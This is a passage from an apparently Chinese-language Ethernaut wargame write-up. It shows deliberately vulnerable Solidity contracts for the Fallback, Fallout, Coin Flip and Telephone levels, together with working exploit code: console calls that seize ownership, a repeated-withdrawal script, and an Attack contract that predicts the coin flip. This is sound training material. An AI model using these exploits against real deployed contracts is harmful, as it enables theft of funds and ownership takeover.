<li>How to send ether when interacting with an ABI</li>
<li>How to send ether outside of the ABI</li>
<li>Converting to and from wei&#x2F;ether units (see <code>help()</code> command)</li>
<li>Fallback methods</li>
</ul>
<h3 id="Sources"><a href="#Sources" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>构造函数中初始化创建者的贡献值为1000 Ether，可以通过<code>contribute()</code>函数增加自己的贡献值，但由于数量限制不是很可行</p>
<p>合约可以有一个未命名的函数，这个函数不能有参数也不能有返回值，如果在一个到合约的调用中，没有其他函数与给定的函数标识匹配（或没有提供调用数据），那么这个函数（<code>fallback</code>函数）会被执行。除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，<code>fallback</code>函数必须标记为<code>payable</code>。</p>
<p>在<a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/060-breaking-changes.html?highlight=receive">solidity 0.6.0</a>之后，<code>fallback</code>函数已经被拆分为一个使用 <code>fallback</code> 关键字定义的回退函数 和 使用关键字 <code>receive</code> 定义的接受以太函数。</p>
<ul>
<li>If present, the receive ether function is called whenever the call data is empty (whether or not ether is received). This function is implicitly <code>payable</code>.</li>
<li>The new fallback function is called when no other function matches (if the receive ether function does not exist then this includes calls with empty call data). You can make this function <code>payable</code> or not. If it is not <code>payable</code> then transactions not matching any other function which send value will revert. You should only need to implement the new fallback function if you are following an upgrade or proxy pattern.</li>
</ul>
<p>所以先通过<code>contribute()</code>函数使<code>contributions[msg.sender]</code> &gt; 0，然后直接向合约转账即可让<code>owner</code>变成自己</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.0001&quot;</span>)&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.001&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204213024493.png" class="" title="image-20211204213024493">



<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><p>Claim ownership of the contract below to complete this level.</p>
<p> Things that might help</p>
<ul>
<li>Solidity Remix IDE</li>
</ul>
<h3 id="Sources-1"><a href="#Sources-1" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>Solidity 0.4.22 之前的构造函数是和合约同名的（0.4.22及之后都采用constructor(…) {…}来声明构造函数），它只在合约创建时执行一次，题目代码中将<code>function Fallout() public payable</code>书写为<code>function Fal1out() public payable</code>，即变成了一个普通函数，导致可以在外部自由调用，从而改变<code>owner</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out();</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204150650577.png" class="" title="image-20211204150650577">



<p>代码还有另外一个问题，首先<code>allocations[allocator]</code>的值来自用户调用<code>allocate</code>存入的数额， <code>sendAllocation</code> 函数可以向<code>allocator</code>地址转账，金额为<code>allocations[allocator]</code>，但是转账后并未清空<code>allocations[allocator]</code>，导致可以一直让合约账户转账，如下演示</p>
<blockquote>
<p>Ethernaut Player address : 0x169C51C027B82267387429C0E8b47C6879A4Fb5d<br>Contract Instance address : 0xa15Accd5E15Fe52018967adFC702C5Afea6fe9D7<br>Another address : 0xdd7587F01659246E942148b70F2bCeD28aB8bC23</p>
</blockquote>
<p>先调用<code>allocate</code>向合约账户转入一些ETH</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">allocate</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.1&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>

<p>然后通过web3用另一个账户也向合约转账</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Tx</span> = <span class="built_in">require</span>(<span class="string">&#x27;ethereumjs-tx&#x27;</span>).<span class="property">Transaction</span></span><br><span class="line"><span class="keyword">const</span> rpcURL = <span class="string">&#x27;&#x27;</span> <span class="comment">// RPC URL</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(rpcURL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> abi = [&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Fal1out&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;payable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;allocate&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;payable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;address&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;allocator&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;address&quot;</span>&#125;],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;allocatorBalance&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;uint256&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;uint256&quot;</span>&#125;],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;view&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;collectAllocations&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;nonpayable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;owner&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;address payable&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;address&quot;</span>&#125;],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;view&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;address payable&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;allocator&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;address&quot;</span>&#125;],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sendAllocation&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;nonpayable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;]</span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">&quot;0xa15Accd5E15Fe52018967adFC702C5Afea6fe9D7&quot;</span> <span class="comment">//合约地址</span></span><br><span class="line"><span class="keyword">const</span> contract = <span class="keyword">new</span> web3.<span class="property">eth</span>.<span class="title class_">Contract</span>(abi, contractAddress)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> account = <span class="string">&#x27;0xdd7587F01659246E942148b70F2bCeD28aB8bC23&#x27;</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransactionCount</span>(account, <span class="function">(<span class="params">err, txCount</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> txObject = &#123;</span><br><span class="line">        <span class="attr">nonce</span>:    web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(txCount),</span><br><span class="line">        <span class="attr">gasLimit</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(<span class="number">8000000</span>),</span><br><span class="line">        <span class="attr">gasPrice</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>)),</span><br><span class="line">        <span class="attr">to</span>: contractAddress,</span><br><span class="line">        <span class="attr">data</span>: contract.<span class="property">methods</span>.<span class="title function_">allocate</span>().<span class="title function_">encodeABI</span>(),</span><br><span class="line">        <span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&#x27;0.101&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> tx = <span class="keyword">new</span> <span class="title class_">Tx</span>(txObject,&#123; <span class="attr">chain</span>: <span class="string">&#x27;rinkeby&#x27;</span>, <span class="attr">hardfork</span>: <span class="string">&#x27;petersburg&#x27;</span> &#125;)</span><br><span class="line">    tx.<span class="title function_">sign</span>(privateKey)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> serializedTx = tx.<span class="title function_">serialize</span>()</span><br><span class="line">    <span class="keyword">const</span> raw = <span class="string">&#x27;0x&#x27;</span> + serializedTx.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    web3.<span class="property">eth</span>.<span class="title function_">sendSignedTransaction</span>(raw, <span class="function">(<span class="params">err, txHash</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err:&#x27;</span>, err)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;txHash:&#x27;</span>, txHash)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">contract.<span class="property">methods</span>.<span class="title function_">allocatorBalance</span>(<span class="string">&quot;0x169C51C027B82267387429C0E8b47C6879A4Fb5d&quot;</span>).<span class="title function_">call</span>(<span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(result) &#125;)</span><br><span class="line">contract.<span class="property">methods</span>.<span class="title function_">allocatorBalance</span>(account).<span class="title function_">call</span>(<span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(result) &#125;)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204162511155.png" class="" title="image-20211204162511155">

<p>查看<a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/address/0xa15Accd5E15Fe52018967adFC702C5Afea6fe9D7">合约</a>，<code>0x169C51C027B82267387429C0E8b47C6879A4Fb5d</code>转入了两次，共0.101 Ether，<code>0xdd7587F01659246E942148b70F2bCeD28aB8bC23</code>转入了3次，共0.202 Ether，合约账户共0.303 Ether</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204163212237.png" class="" title="image-20211204163212237">

<p>调用<code>sendAllocation()</code>3次刚好可将合约账户全部Ether转入<code>0x169C51C027B82267387429C0E8b47C6879A4Fb5d</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendAllocation</span>(<span class="string">&quot;0x169C51C027B82267387429C0E8b47C6879A4Fb5d&quot;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164548931.png" class="" title="image-20211204164548931">

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164600834.png" class="" title="image-20211204164600834">

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164854035.png" class="" title="image-20211204164854035">



<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you’ll need to use your psychic abilities to guess the correct outcome 10 times in a row.</p>
<p> Things that might help</p>
<ul>
<li>See the Help page above, section “Beyond the console”</li>
</ul>
<h3 id="Sources-2"><a href="#Sources-2" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p><code>block.number (uint)</code>：获取当前块高度，<code>sub</code>和<code>div</code>为<code>SafeMath</code>中的方法（减，整除），<code>blockhash(uint blockNumber) returns (bytes32)</code> ：给定块的哈希，仅适用于最近256个块，<code>revert()</code>：中止执行并还原状态更改</p>
<p>代码逻辑为</p>
<ul>
<li>获取上一块的哈希</li>
<li>判断与上一次运行<code>flip</code>函数时得到的哈希是否相同，相同则中止</li>
<li>记录得到的哈希</li>
<li>用得到的哈希整除<code>FACTOR</code>（uint256取值范围为[0,2^256-1]，FACTOR为2^255），结果只会是1或0</li>
<li>以整除的结果作为判断条件</li>
</ul>
<p>代码尝试用<code>blockhash(block.number.sub(1))</code>生成随机数，然而并非随机，其实是可预测的</p>
<p>一个交易是被打包在一个区块里的，通过 <code>Attack</code> 合约去调用 <code>CoinFlip</code> 合约，那么他们的区块信息都是一样的，执行10次<code>exploit()</code>函数即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">abstract contract CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) virtual public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    CoinFlip coinFlip = CoinFlip(0x7F0FC6F70B87B7D8C775D065FA706EAC2e6E1A03);</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function exploit() public returns(bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 flip = blockValue / FACTOR;</span><br><span class="line">        bool side = flip == 1 ? true : false;</span><br><span class="line">        return coinFlip.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204191726341.png" class="" title="image-20211204191726341">

<p><a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/address/0x7F0FC6F70B87B7D8C775D065FA706EAC2e6E1A03">CoinFlip</a>:</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192252584.png" class="" title="image-20211204192252584">

<p><a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/address/0x0D91AbBA809C7CC50a95E8C9f2c3a52B524b7F14">Attack</a>:</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192344309.png" class="" title="image-20211204192344309">

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192357438.png" class="" title="image-20211204192357438">



<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>Claim ownership of the contract below to complete this level.</p>
<p> Things that might help</p>
<ul>
<li>See the Help page above, section “Beyond the console”</li>
</ul>
<h3 id="Sources-3"><a href="#Sources-3" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p><code>tx.origin</code> 是交易的发送方，必然是这个交易的原始发起方，无论中间有多少次合约内&#x2F;跨合约函数调用，而且一定是账户地址而不是合约地址；<code>msg.sender</code> 是消息的发送方，也可以说是函数的直接调用方，在用户手动调用该函数时是发起调用的账户地址，但也可以是调用该函数的一个智能合约的地址</p>
<p>用户可以通过另一个合约 <code>Attack</code> 来调用目标合约中的 <code>changeOwner()</code>，此时，<code>tx.origin</code> 为用户，<code>msg.sender</code> 为 <code>Attack</code>，即可绕过条件，成为 owner</p>
